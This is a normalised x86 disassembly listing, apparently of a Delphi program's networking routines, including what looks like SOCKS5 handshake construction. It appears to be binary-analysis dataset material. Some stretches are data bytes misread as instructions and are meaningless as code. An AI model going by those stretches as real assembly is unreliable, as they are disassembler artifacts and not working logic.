sub_477514
push ebp
mov ebp esp
push ecx
mov ecx 0x29
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_477ae7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x68 ] 0x0
jne r-xdata
mov [ ebp - 0x10e ] 0x2
mov [ ebp - 0x10e ] 0x0
jmp r-xdata
mov al [ ebp - 0x10f ]
cmp al [ ebp - 0xd ]
jne r-xdata
mov al [ ebp - 0x10e ]
mov [ ebp - 0xd ] al
mov [ ebp - 0x110 ] 0x5
mov al 0x1
mov [ ebp - 0x10f ] al
and eax 0xff
add eax 0x2
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx [ ebp - 0xc ]
mov esi [ eax ]
call [ esi + 0x58 ]
xor edx edx
push ebp
push j_sub_4038a4#9
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x2
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x118 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x118 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
cmp al 0xff
jne r-xdata
mov [ ebp - 0x110 ] 0x5
mov [ ebp - 0x10f ] 0x1
mov [ ebp - 0x10e ] 0x0
mov [ ebp - 0x10d ] 0x3
mov eax [ ebp - 0x4 ]
call sub_40436c
mov [ ebp - 0x10c ] al
mov esi 0x5
mov eax [ ebp - 0x4 ]
call sub_40436c
test eax eax
jle r-xdata
mov [ ebp - 0x110 ] 0x1
mov eax [ ebx + 0x78 ]
call sub_40436c
mov [ ebp - 0x10f ] al
mov esi 0x2
mov eax [ ebx + 0x78 ]
call sub_40436c
test eax eax
jle r-xdata
cmp [ ebx + 0x68 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_40436c
add esi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebp - 0x10 ] ax
lea edx [ ebp + esi - 0x110 ]
lea eax [ ebp - 0x10 ]
mov ecx 0x2
call sub_4028e8
add esi 0x2
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx esi
mov esi [ eax ]
call [ esi + 0x58 ]
xor eax eax
push ebp
push sub_477847
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x5
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40436c
push eax
mov eax [ ebp - 0x4 ]
call sub_40456c
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028e8
mov eax [ ebx + 0x78 ]
call sub_40436c
add esi eax
mov eax [ ebx + 0x70 ]
call sub_40436c
mov [ ebp + esi - 0x110 ] al
inc esi
mov eax [ ebx + 0x70 ]
call sub_40436c
test eax eax
jle r-xdata
mov eax [ ebx + 0x78 ]
call sub_40436c
push eax
mov eax [ ebx + 0x78 ]
call sub_40456c
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028e8
xor eax eax
mov al [ ebp - 0x10f ]
cmp eax 0x8
ja r-xdata
mov eax [ ebx + 0x70 ]
call sub_40436c
add esi eax
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx esi
mov esi [ eax ]
call [ esi + 0x58 ]
xor edx edx
push ebp
push sub_47770b
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x2
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebx + 0x70 ]
call sub_40436c
push eax
mov eax [ ebx + 0x70 ]
call sub_40456c
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028e8
lea edx [ ebp - 0x148 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x148 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
jmp [ eax * 4 + r-xdata ]
cmp [ ebp - 0x10f ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x6
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x128 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
jmp r-xdata
lea edx [ ebp - 0x120 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x120 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
xor eax eax
push ebp
push sub_477a98
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0xc ]
dec ecx
lea edx [ ebp - 0x10b ]
mov eax [ ebx + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov al [ ebp - 0x10c ]
add eax 0x2
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x10d ]
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477aee
lea eax [ ebp - 0x14c ]
mov edx 0xf
call sub_4040d0
retn
mov [ ebp - 0xc ] 0x12
jmp r-xdata
sub_477af8
push ebx
mov bl [ eax + 0x7c ]
dec ebx
sub bl 0x2
jb r-xdata
call sub_4772ec
pop ebx
retn
je r-xdata
call sub_477514
jmp r-xdata
pop ebx
retn
sub_477b14
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_477b39
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477b40
retn
sub_477b4c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_477b71
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477b78
retn
sub_477b84
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_477ba9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477bb0
retn
sub_477bc0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
inc edi
add [ eax ] al
jg r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 2 + 0x47 ] ah
inc edi
add [ 0x64491100 ] al
dec ecx
add ah ah
add [ edi ] 0x34
add [ edi ] sub_478164
jo r-xdata
push edi
inc edi
add [ eax + ebp * 2 + 0x7d700047 ] dh
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
clc
add [ edi ] 0xb4
push esi
inc edi
add ah ch
push esi
inc edi
add [ edi + edx * 2 ] bl
inc edi
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax + eax ] dh
add [ eax - 0x1fffb899 ] bl
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax ] al
add [ edi ] 0xffffff90
inc edi
add al dh
add [ edi ] 0x64495412
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov eax [ ebp - 0x4 ]
call sub_42129c
mov eax [ r-xdata ]
call sub_475160
test al al
je r-xdata
popad
nop
push ebx
mov ebx eax
mov eax ebx
call sub_47687c
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
jno r-xdata
add [ ecx + esi * 2 + 0x47 ] dl
arpl [ ebx + 0x73 ] bp
dec ecx
outsb
outsw
add [ eax ] dl
inc eax
add [ eax + eax ] ch
[ eax + eax ]
add [ ebx ] 0x0
or [ ebx + 0x6f ] edx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
mov edi 0x7d
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
mov edx 0x7d
call sub_474704
mov edi eax
jmp r-xdata
pop ebx
retn
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc esp
jge r-xdata
add al bl
add [ edi ] 0x70
add [ edi ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53090003 ] al
outsd
nop
inc ecx
add al ch
push ss
inc edx
add [ edi + ecx * 4 + 0x17c00041 ] ch
inc edx
add [ ebx + eax * 4 + 0x47 ] al
add al dl
pop ss
inc edx
add al cl
sbb [ edx ] al
clc
sbb al [ edx ]
loopne r-xdata
nop
jl r-xdata
cmp edi esi
jge r-xdata
lea esi [ edi + 0x1 ]
test bl bl
je r-xdata
add [ eax + 0x10 ] dh
inc edx
add [ ebx + eax * 4 + 0x47 ] ch
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
adc [ ecx + ecx * 2 + 0x64 ] dl
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + edx * 2 + 0x68 ] si
jb r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edi * 2 + 0x47 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x7d ] bl
inc edi
add [ eax ] cl
add [ eax ] al
in al 0x6e
inc ecx
add al ah
xor al 0x40
add [ edi + ecx + 0x34f00042 ] bh
inc eax
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ edi + ecx + 0x42 ] dl
inc eax
add [ ebp + edi * 2 + 0x47 ] al
inc edi
add [ edi ] al
adc dl [ ecx + ecx * 2 + 0x64 ]
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
mov eax esi
call sub_474ab8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax edi
call sub_474ab8
sub esi edi
test bl bl
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4212c4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_4212cc
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_40436c
test eax eax
jle r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47511c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
lea esi [ edi + 0x1 ]
dec edi
dec eax
popad
outsb
insb
jb r-xdata
add [ ecx ] dl
dec ecx
dec ecx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477edc
mov eax [ ebp - 0x4 ]
call sub_4032b0
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
jmp r-xdata
cmp edi esi
jl r-xdata
xor esi esi
jmp r-xdata
add al 0x0
or [ ebp + 0x73 ] dl
dec esi
popad
insb
lea eax [ eax ]
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax + 0x68 ] dl
sub_477d8c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_477ef2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi 0xfffffffe
sete bl
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_420e84
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_477ed5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov eax [ ebp - 0x4 ]
call sub_42129c
mov eax [ r-xdata ]
call sub_475160
test al al
je r-xdata
mov edi 0x7d
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
mov edx 0x7d
call sub_474704
mov edi eax
jmp r-xdata
cmp edi esi
jge r-xdata
lea esi [ edi + 0x1 ]
test bl bl
je r-xdata
mov eax esi
call sub_474ab8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax edi
call sub_474ab8
sub esi edi
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4212c4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_4212cc
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_40436c
test eax eax
jle r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47511c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
lea esi [ edi + 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477edc
mov eax [ ebp - 0x4 ]
call sub_4032b0
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
jmp r-xdata
cmp edi esi
jl r-xdata
xor esi esi
jmp r-xdata
sub_477f00
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4780d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4782d8
mov al [ eax + 0x7c ]
dec eax
sub al 0x3
jae r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_404144
mov edi [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4782d8
mov edx [ eax + 0x6c ]
lea eax [ ebp - 0x10 ]
call sub_404144
mov eax [ ebp - 0x4 ]
call sub_4782d8
mov edi [ eax + 0x74 ]
jmp r-xdata
lea ecx [ ebp - 0x1c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x10 ]
call sub_472da8
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx edi
call sub_475e60
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
push 0x0
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4755f8
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push esi
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_476880
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x68 ]
xor ecx ecx
mov edx 0x1
mov eax ebx
call sub_475bb4
lea eax [ ebx + 0x14 ]
mov edx [ ebp + 0x18 ]
call sub_404100
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x24 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x28 ] eax
mov eax ebx
call sub_475d40
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x10 ]
call sub_473254
test al al
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4755f8
cmp esi 0xffffffff
je r-xdata
mov eax [ rw-data ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx 0x1
mov edx 0x6
call sub_475cd4
mov eax [ r-xdata ]
call sub_475160
test al al
je r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_472c5c
jmp r-xdata
push ebp
mov eax 0x1d4c0
call sub_477d8c
pop ecx
jmp r-xdata
push ebp
mov eax esi
call sub_477d8c
pop ecx
mov eax [ ebp - 0x4 ]
call sub_4782d8
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_477af8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4780d8
lea eax [ ebp - 0x1c ]
call sub_4040ac
lea eax [ ebp - 0x10 ]
call sub_4040ac
retn
sub_4780f8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4754d4
mov [ esi + 0x6c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_478134
push ebx
mov ebx eax
mov eax ebx
call sub_4768b8
mov eax [ ebx + 0x68 ]
test eax eax
jne r-xdata
mov dl 0x1
call sub_476148
pop ebx
retn
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_475f18
mov [ ebx + 0x68 ] eax
pop ebx
retn
sub_478170
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4781e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
push 0x0
mov edx esi
mov ecx edi
mov eax [ ebx + 0x68 ]
call sub_475c8c
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4781e7
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_4781f0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_478260
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
push 0x0
mov edx esi
mov ecx edi
mov eax [ ebx + 0x68 ]
call sub_475cb0
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478267
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_478270
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov [ ebx + 0x70 ] esi
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x70 ]
test eax eax
je r-xdata
mov eax ebx
call sub_4782d8
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax esi
mov [ ebx + 0x70 ] eax
mov edx ebx
call sub_421440
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_4782d8
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
xor eax eax
mov [ ebx + 0x70 ] eax
lea eax [ ebx + 0x70 ]
call sub_40d564
mov eax [ ebx + 0x70 ]
mov [ eax + 0x80 ] ebx
pop esi
pop ebx
retn
sub_4782d8
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x70 ]
pop ebx
retn
cmp [ ebx + 0x70 ] 0x0
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4772a8
mov [ ebx + 0x70 ] eax
sub_478300
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0x70 ]
test eax eax
je r-xdata
lea eax [ esi + 0x68 ]
call sub_40d564
mov edx ebx
and dl 0xfc
mov eax esi
call sub_476888
test bl bl
jle r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
lea eax [ esi + 0x70 ]
call sub_40d564
sub_478344
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_42168c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x70 ]
jne r-xdata
xor eax eax
mov [ esi + 0x70 ] eax
sub_47836c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4783c1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov edx eax
mov [ ebp - 0xc ] 0x2719
mov [ ebp - 0x8 ] 0x2736
lea ecx [ ebp - 0xc ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_472c68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4212c4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4783d4
mov eax [ ebp - 0x4 ]
add eax 0x44
mov edx [ ebx + 0x4 ]
call sub_404100
call sub_403ae0
mov eax [ ebp - 0x4 ]
call sub_4212c4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4783f8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47841d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478424
retn
sub_4789c5
mov [ edi ] eax
or al 0x0
add [ eax ] al
and [ eax + 0x34e00047 ] cl
inc eax
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0xf004032 ] ah
inc ebp
dec ecx
inc esi
imul ebp [ ebp + 0x4e ] 0x6f46746f
jne r-xdata
or [ edx - 0x2dccffb9 ] 0xffffff8b
inc ebp
cld
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_478a99
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x30 ]
xor eax eax
push ebp
push sub_478a7c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4040ac
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_478c48
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_404374
mov ecx [ eax ]
call [ ecx + 0x38 ]
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478a83
xor edx edx
mov eax [ ebp - 0x4 ]
sub_478aa8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_478b6c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
cmp [ edi + 0x69 ] 0x0
jne r-xdata
mov esi [ edi + 0x7c ]
test esi esi
je r-xdata
cmp [ edi + 0x7c ] 0x0
jne r-xdata
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
mov esi [ edi + 0x7c ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478b73
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
mov eax [ edi + 0x74 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x5c ]
mov dl 0x4
mov eax edi
call sub_4755ec
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x48 ]
xor al 0x1
sete al
or al [ ebp - 0x1 ]
je r-xdata
cmp eax 0x0
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
sub_478b7c
push ebx
push esi
mov ebx eax
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x48 ]
mov edx [ ebx + 0x7c ]
test edx edx
setne al
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x48 ]
sub_478ba4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4754d4
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_476b2c
mov [ esi + 0x6c ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_476b2c
mov [ esi + 0x80 ] eax
push 0x0
push 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_479d78
mov [ esi + 0xa4 ] eax
mov [ esi + 0xa0 ] 0x8000
mov [ esi + 0xa8 ] 0x8000
push esi
push sub_47a200
mov dl 0x1
mov eax [ r-xdata ]
call sub_47a220
mov [ esi + 0x74 ] eax
mov [ esi + 0x88 ] 0x4000
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_478c48
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_4040ac
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov edi [ ebx + 0x74 ]
mov eax edi
mov edx [ eax ]
call [ edx ]
mov edx eax
mov ecx esi
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x20 ]
pop edi
pop esi
pop ebx
retn
push 0x1
or ecx 0xffffffff
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x6c ]
sub_478c88
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x5c ]
cmp [ esi + 0x70 ] 0x0
je r-xdata
lea eax [ esi + 0x74 ]
call sub_40d564
lea eax [ esi + 0xa4 ]
call sub_40d564
lea eax [ esi + 0x80 ]
call sub_40d564
lea eax [ esi + 0x6c ]
call sub_40d564
mov edx ebx
and dl 0xfc
mov eax esi
call sub_47556c
test bl bl
jle r-xdata
lea eax [ esi + 0x7c ]
call sub_40d564
mov [ esi + 0x70 ] 0x0
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_478cec
push ebx
mov ebx eax
mov dl 0x3
mov eax ebx
call sub_4755ec
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
cmp [ ebx + 0x70 ] 0x0
je r-xdata
mov eax ebx
